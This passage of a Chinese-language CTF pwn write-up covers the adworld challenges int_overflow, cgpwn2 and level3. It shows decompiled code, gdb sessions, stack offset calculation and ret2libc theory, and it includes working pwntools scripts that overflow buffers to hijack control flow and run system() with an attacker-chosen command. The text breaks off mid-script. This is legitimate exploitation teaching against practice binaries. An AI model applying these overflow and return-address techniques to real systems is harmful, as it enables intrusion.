class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="type">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数首先声明了 <code>unsigned __int8 v3</code> ，8字节，最大值256。随后通过<code>strlen()</code>计算最大长度可达0x199的变量s的长度，将该变量长度复制给最大值为256的变量v3。这里存在整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">0xffffffff</span>;</span><br><span class="line">b = <span class="number">0x1</span>;</span><br><span class="line">c = a + b;</span><br><span class="line">c = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>c 的最大宽度是8位，a+b之后结果应该是 0x100000000 ，但是由于c只能存储低8位，于是高位产生了截断，导致c只保存了 0x00000000，即c&#x3D;0。</p>
<p>在接下来的if判断中，如果没有通过判断，即长度 <code>3&lt;v3&lt;8</code> 可以执行<code>strcpy()</code>，将函数自己带过来的参数复制到变量 <code>dest</code>中，而这个变量距离<code>ebp</code>有0x14字节的距离，我们可以通过此来使得栈溢出，首先填充到<code>$ebp</code>（0x14字节），然后越过<code>previous $ebp</code>（4字节），覆盖到返回地址。</p>
<p>现在有几个问题：</p>
<ol>
<li>如何经过if判断？</li>
<li>覆盖到返回地址需要填充多少字节？</li>
<li>让函数返回到哪里？</li>
</ol>
<p>对第一个问题，我们利用整数溢出，条件是3-8之间，那我们只需要256+3或256+8即可让其溢出后只保留低位的数字。如果我们只用3-8之间的参数数量去输入，那我们的payload不够写。</p>
<p>对第二个问题，其实上文已经说了需要填充 0x14+4。同时为了满足if判断，我们要用256+8(我们这里选择了较大的数)来减去填充的数据，以及返回地址的长度：256+8-0x14-4-8&#x3D;234个字节填充数据，来给到s足够的长度。</p>
<p>对第三个问题，我们可以找到题目的后门函数<code>what is this</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">what_is_this</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其函数起始地址为<code>0x804868B</code>，此即用作函数返回地址。</p>
<p>于是，payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">63884</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./int_overflow&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># backdoor func addr</span></span><br><span class="line">retaddr = <span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding 0x14 + 4($ebp) + 8(addr) + 232</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span> + <span class="string">&quot;BBBB&quot;</span> + p32(retaddr) + <span class="string">&quot;b&quot;</span>*<span class="number">234</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>32位程序，查看保护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有开启栈保护和地址随机化，开启了堆栈代码不可执行，我们要想办法利用题目自身的代码。</p>
<p>本地运行完知道基本功能后，打开IDA查看：定位到hello()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">hello</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;s &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="type">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; <span class="number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,you can leave some message here:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets()明显存在溢出，先来判断一下需要溢出多少（<code>char s; // [esp+12h] [ebp-26h]</code>这里IDA判断出与ebp的偏移为0x26，但我们为了防止不出错，还是自己验证一下的好）。使用GDB在gets()下断点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">Starting program: /home/brian/桌面/adworld/cgpwn2 </span><br><span class="line">please tell me your name</span><br><span class="line">admin</span><br><span class="line">hello,you can leave some message here:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080485f7 in hello ()</span><br><span class="line">gdb-peda$ n</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb45c0 --&gt; 0xfbad208b </span><br><span class="line">EDX: 0xf7fb589c --&gt; 0x0 </span><br><span class="line">ESI: 0x1c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffd138 (&quot;BBBB&quot;)</span><br><span class="line">ESP: 0xffffd100 --&gt; 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">EIP: 0x80485fc (&lt;hello+154&gt;:	nop)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x80485f1 &lt;hello+143&gt;:	lea    eax,[ebp-0x26]</span><br><span class="line">   0x80485f4 &lt;hello+146&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x80485f7 &lt;hello+149&gt;:	call   0x80483f0 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x80485fc &lt;hello+154&gt;:	nop</span><br><span class="line">   0x80485fd &lt;hello+155&gt;:	add    esp,0x30</span><br><span class="line">   0x8048600 &lt;hello+158&gt;:	pop    ebx</span><br><span class="line">   0x8048601 &lt;hello+159&gt;:	pop    esi</span><br><span class="line">   0x8048602 &lt;hello+160&gt;:	pop    ebp</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd100 --&gt; 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0004| 0xffffd104 --&gt; 0x32 (&#x27;2&#x27;)</span><br><span class="line">0008| 0xffffd108 --&gt; 0xf7fb45c0 --&gt; 0xfbad208b </span><br><span class="line">0012| 0xffffd10c --&gt; 0x0 </span><br><span class="line">0016| 0xffffd110 --&gt; 0x41414000 (&#x27;&#x27;)</span><br><span class="line">0020| 0xffffd114 (&#x27;A&#x27; &lt;repeats 36 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0024| 0xffffd118 (&#x27;A&#x27; &lt;repeats 32 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0028| 0xffffd11c (&#x27;A&#x27; &lt;repeats 28 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x080485fc in hello ()</span><br><span class="line">gdb-peda$ x/20wx $ebp-4 //从ebp-4开始查看20个内存单元的内容</span><br><span class="line">0xffffd134:	0x41414141	0x42424242	0x08048600	0xf7fb4ce0</span><br><span class="line">0xffffd144:	0x00000000	0x0804867b	0x00000000	0xf7fb4000</span><br><span class="line">0xffffd154:	0xf7fb4000	0x00000000	0xf7df4f21	0x00000001</span><br><span class="line">0xffffd164:	0xffffd1f4	0xffffd1fc	0xffffd184	0x00000001</span><br><span class="line">0xffffd174:	0x00000000	0xf7fb4000	0xf7fe571a	0xf7ffd000</span><br><span class="line">gdb-peda$ x/20wx $ebp</span><br><span class="line">0xffffd138:	0x42424242	0x08048600	0xf7fb4ce0	0x00000000</span><br><span class="line">0xffffd148:	0x0804867b	0x00000000	0xf7fb4000	0xf7fb4000</span><br><span class="line">0xffffd158:	0x00000000	0xf7df4f21	0x00000001	0xffffd1f4</span><br><span class="line">0xffffd168:	0xffffd1fc	0xffffd184	0x00000001	0x00000000</span><br><span class="line">0xffffd178:	0xf7fb4000	0xf7fe571a	0xf7ffd000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看到，在我们输入38个A之后，剩余的4个B（’A’ &lt;repeats 38 times&gt;, “BBBB”）刚好覆盖完了ebp（EBP: 0xffffd138 (“BBBB”)）。</p>
<p>ok，那么38个A+4个B之后的4字节就是我们要覆盖的返回地址，那我们要让它返回到哪里？查看程序还发现了题目预留的后门函数pwn():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span><span class="comment">// starts at 804854D</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo hehehe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然system函数的参数已经写好了，我们先让函数返回到这里试试能不能成功执行给定的参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgpwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp-&gt; &#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot; </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">38</span> + <span class="string">&quot;BBBB&quot;</span> + p32(<span class="number">0x804854D</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;hello,you can leave some message here:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我们从终端看到成功输出<code>hehehe</code>，接下来考虑如何让system执行<code>/bin/sh</code>等命令。</p>
<p>一般来说函数的调用方式都是<code>参数+返回地址+函数地址</code>按照这个顺序入栈随后带着传入的参数执行函数。</p>
<p><img src="/Users/brian/Desktop/typro/pictures/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A0%88%E5%8F%98%E5%8C%96.png" alt="函数调用过程栈变化"></p>
<p>函数地址好说，这里的函数地址不再是我们上面代码中的<code>0x804854D</code>(这是pwn()的地址)，我们只需要system()。我们在pwn()中找到<code>call _system</code>汇编，点击<code>_system</code>即可看到system()的具体信息 <code>0x8048420</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048420 ; int system(const char *command)</span><br><span class="line">.plt:08048420 _system         proc near               ; CODE XREF: pwn+D↓p</span><br><span class="line">.plt:08048420</span><br><span class="line">.plt:08048420 command         = dword ptr  4</span><br><span class="line">.plt:08048420</span><br><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br></pre></td></tr></table></figure>

<p>返回地址也好说，我们目标只是让它执行，执行完去哪不重要，随便给4字节就行。</p>
<p>参数不好说，因为函数调用时我们说的参数不是字符串，实际上还是一个指向参数的地址。我们要到哪里找一个内容是我们控制的地址？fgets()函数！</p>
<p>在gets()上面我们可以输入通过fgets()输入内容，会被保存到变量 name 中。fgets()比gets()函数安全，因为它限制了输入长度，通常不会产生溢出。找到name的地址为<code>0x0804A080</code>，我们在第一步输入名字时输入想要执行的命令即可，那么payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">63884</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgpwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp-&gt; &#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot; </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = padding + system_addr + ret_addr + argu_addr</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">38</span> + <span class="string">&quot;BBBB&quot;</span> + p32(<span class="number">0x8048420</span>) + <span class="string">&quot;c&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x804A080</span>) </span><br><span class="line">p.recvuntil(<span class="string">&quot;hello,you can leave some message here:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里在本地调试，我们成功执行了<code>whoami</code> 命令，接下来只需要修改命令即可。</p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这道题开始有那味了。</p>
<p>题目给的附件中给出了libc.so文件，附件为32位ELF文件，保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有栈溢出保护，没有地址随机化，堆栈代码不可执行，我们没办法注入shellcode来执行了。IDA打开附件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中vulnerable_function()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Read()</code>存在明显的栈溢出。由于目前我们没有找到可用的<code>system()</code>，所以目前溢出后的返回地址我们还不能确定。</p>
<p>题目中给了我们libc文件，是想让我们利用它，考察 <code>ret2libc</code>。</p>
<p>在动态链接的完成后，libc.so文件中的各个函数之间的间隔在编译完成后的 <code>ELF文件</code> 中仍保持不变。因此我们可以利用libc.so中的<code>system()</code>和<code>write()</code>，配合我们<code>ELF</code>的<code>write()</code>函数来获取链接完成之后<code>ELF文件</code>中<code>system()</code>函数的绝对地址：<code>system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</code></p>
<p>在找到<code>system()</code>之后我们还需要参数<code>/bin/sh</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brian@brian:~/桌面/adworld/level3$ ROPgadget --binary libc_32.so.6 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015902b : /bin/sh</span><br></pre></td></tr></table></figure>

<p>同样的计算方式可以利用间隔不变通过参数在<code>ELF文件</code>中的地址和<code>write()</code>的地址来算出参数最后在程序中的地址。</p>
<p><code>write_libc_addr</code> 和 <code>system_libc_addr</code> 我们可以通过IDA打开附件给的 libc.so 文件来查找其地址。</p>
<p><code>write_abs_addr</code> 应该去哪里找？这个地址也就是<code>ELF</code>文件中的地址，我们可以通过栈溢出，溢出到<code>write()</code>的<code>PLT</code>位置，调用该函数，然后构造参数，来将这个地址打印出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + write_plt_addr + vuln_func_addr + argus</span><br></pre></td></tr></table></figure>

<p>根据32位程序的函数调用顺序可知，<code>padding</code> 之后首先跟的是 <code>write_plt_addr</code> ，这个地址是 <code>write</code>函数在<code>.got</code>中的地址，溢出后控制函数回到这个地址</p>
<p>这里的 <code>argus</code>分别为 <code>1,write_got_addr,4</code> 代表将 <code>write_got_addr</code> 的地址以4个字节进行标准输出。在计算完需要的绝对地址后将函数再次返回到 <code>vuln_fun_addr</code> 方便再次利用栈溢出，调用<code>system()</code>。</p>
<p>栈溢出的偏移怎么算呢？除了手动之外今天学了新方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line">gdb-peda$:</span><br><span class="line">Input:</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">······</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x6261616b <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">$ cyclic -l 0x6261616b </span><br><span class="line"><span class="comment"># padding 140</span></span><br></pre></td></tr></table></figure>

<p>通过输入类似于循环的长数据来判断溢出位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 